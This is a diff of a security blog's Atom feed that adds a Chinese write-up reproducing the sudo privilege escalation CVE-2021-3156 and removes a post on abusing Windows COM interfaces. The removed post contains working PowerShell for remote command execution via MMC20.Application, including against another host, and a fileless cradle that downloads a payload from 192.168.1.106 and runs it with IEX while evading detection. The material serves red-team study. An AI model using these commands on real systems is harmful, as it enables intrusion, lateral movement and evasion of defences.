@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-01-31T09:11:19.822Z</updated>
+  <updated>2021-01-31T10:05:56.642Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2021-3156 sudo提权漏洞复现</title>
+    <link href="http://422926799.github.io/posts/14fbb503.html"/>
+    <id>http://422926799.github.io/posts/14fbb503.html</id>
+    <published>2021-01-31T09:51:17.000Z</published>
+    <updated>2021-01-31T10:05:56.642Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Sudo 1.8.2 – 1.8.31p2<br>Sudo 1.9.0 – 1.9.5p1</p><p>sudo官方位于1月26号已经修复，后面在安装的sudo已经补上了<br><img src="https://s3.ax1x.com/2021/01/31/yErSN6.png" alt=""><br>官方链接：<a href="https://www.sudo.ws/" target="_blank" rel="noopener">https://www.sudo.ws/</a></p><p><strong>不影响的版本</strong><br>sudo =&gt;1.9.5p2</p><p>exp：<a href="https://github.com/422926799/note/tree/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2021-3156" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2021-3156</a><br>来源于某微信公众号:<a href="https://mp.weixin.qq.com/s/c9UiJ74TbLXziK08tumIHA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/c9UiJ74TbLXziK08tumIHA</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Debain Sudo version 1.8.31p1<br>Ubuntu Sudo version 1.8.21p2 （昨天安的sudo已经修复）</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>检测是否存在漏洞</p><pre><code>sudoedit -s /</code></pre><p>存在<br><img src="https://s3.ax1x.com/2021/01/31/yErYEq.png" alt=""></p><p>不存在<br><img src="https://s3.ax1x.com/2021/01/31/yErg56.png" alt=""></p><p>下载exp，make。然后运行sudo-hax-me-a-sandwich<br><img src="https://s3.ax1x.com/2021/01/31/yErhxe.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/31/yErbIP.png" alt=""></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Sudo 1.8.2 – 1.8.31p2&lt;br&gt;Sudo 1.9.0 – 1.9.5p1&lt;/p&gt;
+&lt;p&gt;sudo官方位于1</summary>
+      
+    
+    
+    
+    
+    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
+    
+  </entry>
   
   <entry>
     <title>某word恶意VBA样本分析</title>
@@ -438,28 +461,6 @@
       
     <summary type="html">&lt;p&gt;水了一天，明天出发准备上学。先去玩几天，早上原本就打算写&lt;br&gt;刷b站硬是刷到了晚上&lt;/p&gt;
 &lt;h2 id=&quot;UAC是何物&quot;&gt;&lt;a href=&quot;#UAC是何物&quot; class=&quot;headerlink&quot; title=&quot;UAC是何物&quot;&gt;&lt;/a&gt;UAC是何物&lt;/h2&gt;&lt;blockq</summary>
-      
-    
-    
-    
-    
-    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>COM接口学习与利用</title>
-    <link href="http://422926799.github.io/posts/ed9cc210.html"/>
-    <id>http://422926799.github.io/posts/ed9cc210.html</id>
-    <published>2020-10-02T17:03:33.000Z</published>
-    <updated>2020-10-02T17:18:51.402Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="何为COM"><a href="#何为COM" class="headerlink" title="何为COM"></a>何为COM</h2><p>OM component（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。由此带来的好处是多方面的：可以将系统中的组件用新的替换掉，以便随时进行系统的升级和定制；可以在多个应用系统中重复利用同一个组件；可以方便的将应用系统扩展到网络环境下；COM与语言，平台无关的特性使所有的程序员均可充分发挥自己的才智与专长编写组件模块。</p><p>找了篇文章编写了一个COM接口<br>参考链接:<a href="https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html</a><br>COM接口里有个calc函数<br><img src="https://s1.ax1x.com/2020/10/03/01Qete.png" alt=""></p><p>生成DLL后，用regsvr32注册完后，可以在HKEY_CLASSES_ROOT\CLSID\下可以见到注册好的dll<br><img src="https://s1.ax1x.com/2020/10/03/01QmfH.md.png" alt=""></p><p>使用powershell可以查询对应COM的可用函数</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;20CE411F-4415-4017-B797-66AE3B8C9A4D&quot;)) #枚举对于appid可用的函数$obj | get-member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QK1A.png" alt=""></p><p>调用对应COM接口的函数</p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;20CE411F-4415-4017-B797-66AE3B8C9A4D&quot;))$handle.calc()</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01Q30f.png" alt=""></p><h2 id="注册表路径说明"><a href="#注册表路径说明" class="headerlink" title="注册表路径说明"></a>注册表路径说明</h2><p>HKEY_CLASSES_ROOT\CLSID 所有COM接口对应的CLSID都在这个项或子项下<br><img src="https://s1.ax1x.com/2020/10/03/01QYtg.png" alt=""></p><p>CLSID项下场见的子项</p><pre><code>* lnprocServer32* TypeLib* version* progID</code></pre><p>lnprocServer32写着这个COM接口处理的dll<br><img src="https://s1.ax1x.com/2020/10/03/01QUpj.png" alt=""></p><p>InprocServer32写着接口的信息/版本<br><img src="https://s1.ax1x.com/2020/10/03/01Qdcn.png" alt=""></p><h2 id="枚举机器上所有的CLSID"><a href="#枚举机器上所有的CLSID" class="headerlink" title="枚举机器上所有的CLSID"></a>枚举机器上所有的CLSID</h2><p>指定类名为WIN32_DCOMApplication</p><pre><code>Get-CimInstance -ClassName WIN32_DCOMApplication</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QwXq.png" alt=""></p><p>Get-CimInstance （简写：Get-cim）作用：从CIM服务器获取类的CIM实例<br><img src="https://s1.ax1x.com/2020/10/03/01QBn0.png" alt=""></p><p>CIM：公共信息模型（CIM）是用于描述受管理资源（如存储，网络或软件组件）的结构和行为的DMTF标准[DSP0004]。</p><p>查询指定CLSID可用函数</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C5EDFC9D-B018-41A4-9877-39AB18469C3A&quot;))$obj | get-member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QDBV.png" alt=""></p><p>快速提起所有CLSID和对应的CLSID里的函数</p><pre><code>Get-CimInstance -ClassName WIN32_DCOMApplication | Select-Object appid | out-file clsids.txt$Position  = 1$Filename = &quot;win10-clsid-members.txt&quot;$inputFilename = &quot;clsids.txt&quot;ForEach($CLSID in Get-Content $inputFilename) {      Write-Output &quot;$($Position) - $($CLSID)&quot;      Write-Output &quot;------------------------&quot; | Out-File $Filename -Append      Write-Output $($CLSID) | Out-File $Filename -Append      $handle = [activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))      $handle | Get-Member | Out-File $Filename -Append      $Position += 1}</code></pre><p>（Method为方法，Property为参数设置之类的）<br><img src="https://s1.ax1x.com/2020/10/03/01QTAO.md.png" alt=""></p><p>枚举某个Application</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Excel.Application&quot;))  $obj | Get-Member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QH4e.png" alt=""></p><p>属性继续枚举</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;49B2791A-B1AE-4C90-9B8E-E860BA07F889&quot;))$obj.Document | Get-Member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QL3d.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/10/03/01Qvut.png" alt=""></p><h2 id="寻找可利用的COM接口"><a href="#寻找可利用的COM接口" class="headerlink" title="寻找可利用的COM接口"></a>寻找可利用的COM接口</h2><p>对应的CLSID是MMC.exe（那么是否代表着系统自带的程序可以执行命令的话，可以找找一个COM接口的函数），如果是不开源的话只能用IDA或Oleview.exe反编译了<br><img src="https://s1.ax1x.com/2020/10/03/01QzHf.md.png" alt=""></p><p>COM接口里枚举出来的函数（如果是微软公开的话）可以到：<a href="https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&amp;terms=" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&amp;terms=</a> 搜索<br>例如：ExecuteShellCommand <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand</a><br><img src="https://s1.ax1x.com/2020/10/03/01l9US.png" alt=""></p><p>调用函数（注意:如果注册表查询CLSID子项带有ProgID的话需要指定ProgID调用方法或属性）<br><img src="https://s1.ax1x.com/2020/10/03/01lC4g.png" alt=""></p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;))$handle.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lkgs.png" alt=""></p><p>思考：能不能通过微软文档搜索比如什么：Exec,command,file.urldownload这些函数，如果找的到在CLSID项里搜索对应的exe/dll，然后调用呢。或在HKEY_CLASSES_ROOT\CLSID下寻找有ProgID的子项CLSID，寻找可利用项。为什么要找带有ProgID子项的CLSID？因为这些一般都是系统自带的</p><h2 id="利用COM接口"><a href="#利用COM接口" class="headerlink" title="利用COM接口"></a>利用COM接口</h2><p>可以根据对应COM接口枚举出的函数名进行分析，或者猜解。例如</p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;00020906-0000-0000-C000-000000000046&quot;))$handle.ExecuteExcel4Macro(&quot;EXEC(&quot;&quot;calc.exe&quot;&quot;)&quot;)</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lK5F.png" alt=""></p><blockquote><p>比如，F5078F35-C551-11D3-89B9-0000F81FE221}这个COM对象（Msxml2.XMLHTTP.3.0）对外提供了一个XML HTTP 3.0功能，可以用来下载任意代码并执行，无需将payload写入磁盘，也不会触发基于System.Net.WebClient的常用检测规则。XML HTTP 3.0对象通常用来发起AJAX请求。在这种情况下，获取数据的方式非常简单，直接使用Invoke-Expression cmdlet（IEX）即可。</p></blockquote><pre><code>$o = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;));$o.Open(&quot;GET&quot;, &quot;http://192.168.1.106/payload.txt&quot;, $False);$o.Send();IEX $o.responseText;</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01l129.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/10/03/01l3vR.png" alt=""></p><p>对应的open函数反汇编<br><img src="https://s1.ax1x.com/2020/10/03/01lGK1.png" alt=""></p><p>文章里有用 Oleview.exe进行对dll的反编译，也有用IDA对指定DLL的函数进行分析。需要一定的基础进行分析<br>COM的利用方式：</p><pre><code>* 寻找COM接口对应注册表的lnprocServer32缺少的dll/exe替换进行提权* 利用COM接口远程调用</code></pre><p>COM远程利用：</p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.113.130&quot;))$handle.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lJDx.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/10/03/01lYb6.md.png" alt=""></p><p>参考链接:<br><a href="https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html</a><br><a href="https://www.anquanke.com/post/id/217928" target="_blank" rel="noopener">https://www.anquanke.com/post/id/217928</a><br><a href="https://www.anquanke.com/post/id/179927" target="_blank" rel="noopener">https://www.anquanke.com/post/id/179927</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;何为COM&quot;&gt;&lt;a href=&quot;#何为COM&quot; class=&quot;headerlink&quot; title=&quot;何为COM&quot;&gt;&lt;/a&gt;何为COM&lt;/h2&gt;&lt;p&gt;OM component（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发</summary>
       
     
     
